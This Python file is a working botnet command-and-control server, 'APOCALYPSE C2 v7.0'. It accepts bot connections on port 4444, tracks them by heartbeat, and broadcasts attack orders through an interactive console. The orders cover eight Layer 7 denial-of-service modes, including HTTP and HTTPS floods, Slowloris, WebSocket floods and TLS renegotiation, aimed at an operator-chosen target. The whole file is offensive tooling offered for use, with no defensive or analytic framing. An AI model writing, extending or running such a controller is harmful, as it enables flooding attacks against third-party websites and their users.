#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# APOCALYPSE C2 SERVER v7.0
# BY: 𝙳𝚎𝚊𝚝Nex

import socket
import threading
import json
import time
import os
import hashlib
from datetime import datetime

# Colors
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
DIM = '\033[2m'
RESET = '\033[0m'

# Simple Banner
BANNER = f"""
{CYAN}┌─────────────────────────────────────────┐
  💀 APOCALYPSE C2 v7.0                        
  BY: 𝙳𝚎𝚊𝚝Nex                                 
  📡 C2 SERVER - L7 MASTER               
└─────────────────────────────────────────┘{RESET}
"""

class ApocalypseC2:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.bots = {}
        self.running = True
        self.modes = {
            '1': 'http_l7',
            '2': 'https_l7',
            '3': 'slowloris_l7',
            '4': 'pipeline_l7',
            '5': 'websocket_l7',
            '6': 'tls_reneg_l7',
            '7': 'dns_over_https',
            '8': 'all_l7'
        }
    
    def log(self, msg, level='info'):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if level == 'success':
            print(f"{DIM}[{timestamp}]{RESET} {GREEN}✓ {msg}{RESET}")
        elif level == 'error':
            print(f"{DIM}[{timestamp}]{RESET} {RED}✗ {msg}{RESET}")
        else:
            print(f"{DIM}[{timestamp}]{RESET} {CYAN}• {msg}{RESET}")
    
    def handle_bot(self, conn, addr):
        bot_id = hashlib.md5(f"{addr[0]}:{time.time()}".encode()).hexdigest()[:8]
        self.bots[bot_id] = {'conn': conn, 'ip': addr[0], 'last_seen': time.time()}
        self.log(f"Bot connected: {bot_id} [{addr[0]}]", 'success')
        
        while self.running:
            try:
                data = conn.recv(4096).decode()
                if not data:
                    break
                msg = json.loads(data)
                if msg.get('type') == 'heartbeat':
                    self.bots[bot_id]['last_seen'] = time.time()
            except:
                break
        
        del self.bots[bot_id]
        self.log(f"Bot disconnected: {bot_id}", 'error')
        conn.close()
    
    def broadcast(self, command):
        cmd_json = json.dumps(command)
        success = 0
        for bot_id, bot in self.bots.items():
            try:
                bot['conn'].send(cmd_json.encode())
                success += 1
            except:
                pass
        self.log(f"Command sent to {success}/{len(self.bots)} bots", 'info')
        return success
    
    def show_bots(self):
        print(f"\n{CYAN}┌─────────────────────────────────────────┐{RESET}")
        print(f"{CYAN}│  🤖 BOTS: {len(self.bots)}{' ' * 26}{CYAN}│{RESET}")
        print(f"{CYAN}├─────────────────────────────────────────┤{RESET}")
        for bot_id, bot in self.bots.items():
            elapsed = time.time() - bot['last_seen']
            print(f"{CYAN}│  {GREEN}▶{RESET} {bot_id} | {bot['ip']} | {elapsed:.1f}s{CYAN}│{RESET}")
        print(f"{CYAN}└─────────────────────────────────────────┘{RESET}\n")
    
    def show_help(self):
        print(f"""
{CYAN}┌─────────────────────────────────────────┐
│  🎯 ATTACK MODE                         │
├─────────────────────────────────────────┤
│  1. HTTP L7 Flood                       │
│  2. HTTPS L7 Flood                      │
│  3. Slowloris L7                        │
│  4. HTTP Pipelining L7                  │
│  5. WebSocket L7 Flood                  │
│  6. TLS Renegotiation L7                │
│  7. DNS over HTTPS                      │
│  8. ALL L7 MODES                        │
└─────────────────────────────────────────┘

{CYAN}Commands:{RESET}
  bots              - Show bots
  attack <mode> <target> [duration]
  exit              - Stop server
""")
    
    def cli(self):
        while self.running:
            cmd = input(f"\n{CYAN}[C2]{RESET} > ").strip().lower()
            
            if cmd == 'bots':
                self.show_bots()
            elif cmd == 'help':
                self.show_help()
            elif cmd.startswith('attack'):
                parts = cmd.split(' ', 3)
                if len(parts) >= 3:
                    mode = parts[1]
                    target = parts[2]
                    duration = int(parts[3]) if len(parts) > 3 else 60
                    if mode in self.modes:
                        self.broadcast({'type': 'attack', 'mode': self.modes[mode], 'target': target, 'duration': duration})
                    else:
                        print(f"{YELLOW}Invalid mode! Use 1-8{RESET}")
                else:
                    print(f"{YELLOW}Usage: attack <mode> <target> [duration]{RESET}")
            elif cmd == 'exit':
                self.running = False
                break
    
    def start(self):
        os.system('clear')
        print(BANNER)
        print()
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(50)
        
        self.log(f"Listening on {self.host}:{self.port}", 'success')
        self.log("Waiting for bots...", 'info')
        self.show_help()
        
        threading.Thread(target=self.cli, daemon=True).start()
        
        while self.running:
            try:
                conn, addr = server.accept()
                threading.Thread(target=self.handle_bot, args=(conn, addr)).start()
            except:
                pass

if __name__ == "__main__":
    c2 = ApocalypseC2()
    c2.start()
